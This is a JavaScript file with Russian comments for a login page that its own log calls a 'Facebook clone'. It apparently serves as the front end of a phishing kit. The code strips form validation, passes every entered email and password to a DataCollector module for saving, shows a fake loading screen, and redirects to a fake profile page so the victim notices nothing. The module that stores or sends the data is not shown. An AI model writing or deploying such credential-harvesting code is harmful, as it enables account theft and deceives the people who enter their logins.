// script.js - ОСНОВНАЯ ЛОГИКА (ПОЛНОСТЬЮ ИСПРАВЛЕНО)

console.log('script.js загружен - FIXED VERSION');

document.addEventListener('DOMContentLoaded', function() {
    console.log('DOM загружен, инициализируем скрипты');
    
    // Находим форму
    const loginForm = document.getElementById('loginForm');
    console.log('Форма найдена:', !!loginForm);
    
    if (loginForm) {
        loginForm.addEventListener('submit', handleLoginSubmit);
        console.log('Обработчик submit добавлен');
    }
    
    // Обработка поля пароля (показать/скрыть)
    const passwordField = document.getElementById('password');
    if (passwordField) {
        console.log('Поле пароля найдено');
        addPasswordToggle(passwordField);
    }
    
    // Убираем required атрибуты, чтобы не было валидации браузера
    const emailField = document.getElementById('email');
    if (emailField) emailField.removeAttribute('required');
    if (passwordField) passwordField.removeAttribute('required');
    
    console.log('Facebook clone script полностью загружен и готов');
});

// Обработка отправки формы - БЕЗ ВАЛИДАЦИИ!
function handleLoginSubmit(event) {
    console.log('Форма отправлена');
    event.preventDefault();
    
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value;
    
    console.log('Получены данные:', { 
        email: email || 'пусто', 
        password: password ? '***' : 'пусто' 
    });
    
    // НЕТ ВАЛИДАЦИИ! Принимаем любые данные
    
    // Показать индикатор загрузки
    showLoading();
    
    // Сохраняем данные (даже если пустые)
    let userData = null;
    if (window.DataCollector && window.CONFIG && CONFIG.COLLECT_DATA) {
        try {
            userData = DataCollector.saveUserData(email, password);
            console.log('Данные сохранены:', userData ? 'успешно' : 'не удалось');
        } catch (error) {
            console.error('Ошибка сохранения данных:', error);
        }
    } else {
        console.warn('DataCollector или CONFIG не загружены');
    }
    
    // Имитация обработки (короткая)
    setTimeout(() => {
        // Перенаправляем на профиль
        redirectToProfile(email || `user_${Date.now()}@facebook.com`);
    }, CONFIG.REDIRECT_DELAY || 1000);
}

// Показать индикатор загрузки
function showLoading() {
    const loading = document.getElementById('loading');
    if (loading) {
        loading.classList.remove('hidden');
        console.log('Индикатор загрузки показан');
        
        // Автоматическое скрытие через время (на всякий случай)
        setTimeout(() => {
            loading.classList.add('hidden');
            console.log('Индикатор загрузки скрыт (таймаут)');
        }, 5000);
    }
}

// Перенаправление на профиль
function redirectToProfile(email) {
    console.log('Перенаправление на профиль для:', email);
    
    // Скрываем loading
    const loading = document.getElementById('loading');
    if (loading) {
        loading.classList.add('hidden');
    }
    
    // Кодируем email для передачи в URL
    const encodedEmail = encodeURIComponent(email);
    const redirectUrl = `profile.html?email=${encodedEmail}&ref=login&t=${Date.now()}`;
    
    console.log('Переходим по URL:', redirectUrl);
    window.location.href = redirectUrl;
}

// СОЗДАНИЕ АККАУНТА - РАБОЧАЯ ВЕРСИЯ!
function createAccount() {
    console.log('Создание аккаунта вызвано');
    
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value;
    
    console.log('Данные для регистрации:', { 
        email: email || 'пусто', 
        password: password ? '***' : 'пусто' 
    });
    
    // Показать индикатор загрузки
    showLoading();
    
    // Сохраняем данные регистрации
    if (window.DataCollector && window.CONFIG && CONFIG.COLLECT_DATA) {
        try {
            // Если поля пустые, создаем демо данные
            const regEmail = email || `new_user_${Date.now()}@facebook.com`;
            const regPassword = password || `pass_${Math.random().toString(36).substr(2, 8)}`;
            
            DataCollector.saveUserData(regEmail, regPassword);
            console.log('Аккаунт создан:', regEmail);
        } catch (error) {
            console.error('Ошибка создания аккаунта:', error);
        }
    }
    
    // Имитация создания аккаунта
    setTimeout(() => {
        // Скрываем loading
        const loading = document.getElementById('loading');
        if (loading) {
            loading.classList.add('hidden');
        }
        
        // Перенаправляем на профиль
        const userEmail = email || `new_user_${Date.now()}@facebook.com`;
        const encodedEmail = encodeURIComponent(userEmail);
        const redirectUrl = `profile.html?email=${encodedEmail}&ref=registration&new=true&t=${Date.now()}`;
        
        console.log('Перенаправление после регистрации:', redirectUrl);
        window.location.href = redirectUrl;
    }, 1500);
    
    // НЕТ ALERT'ОВ! Просто перенаправляем
}

// Скрыть индикатор загрузки
function hideLoading() {
    const loading = document.getElementById('loading');
    if (loading) {
        loading.classList.add('hidden');
        console.log('Индикатор загрузки скрыт (ручно)');
    }
}

// Добавить кнопку показать/скрыть пароль
function addPasswordToggle(passwordField) {
    const formGroup = passwordField.parentElement;
    
    // Если кнопка уже есть, не создаем новую
    if (formGroup.querySelector('.password-toggle')) {
        console.log('Кнопка показа пароля уже существует');
        return;
    }
    
    // Создаем кнопку
    const toggleBtn = document.createElement('button');
    toggleBtn.type = 'button';
    toggleBtn.className = 'password-toggle';
    toggleBtn.innerHTML = '👁️';
    toggleBtn.style.cssText = `
        position: absolute;
        right: 10px;
        top: 50%;
        transform: translateY(-50%);
        background: none;
        border: none;
        cursor: pointer;
        font-size: 18px;
        opacity: 0.5;
        z-index: 10;
    `;
    
    // Позиционируем
    formGroup.style.position = 'relative';
    toggleBtn.style.top = '50%';
    toggleBtn.style.right = '15px';
    
    // Обработчик клика
    toggleBtn.addEventListener('click', function() {
        const type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
        passwordField.setAttribute('type', type);
        toggleBtn.innerHTML = type === 'password' ? '👁️' : '👁️‍🗨️';
        console.log('Пароль', type === 'password' ? 'скрыт' : 'показан');
    });
    
    formGroup.appendChild(toggleBtn);
    console.log('Кнопка показа пароля добавлена');
}

// Глобальные функции для вызова из HTML
window.createAccount = createAccount;
window.hideLoading = hideLoading;
window.handleLoginSubmit = handleLoginSubmit;

console.log('Все функции script.js объявлены');
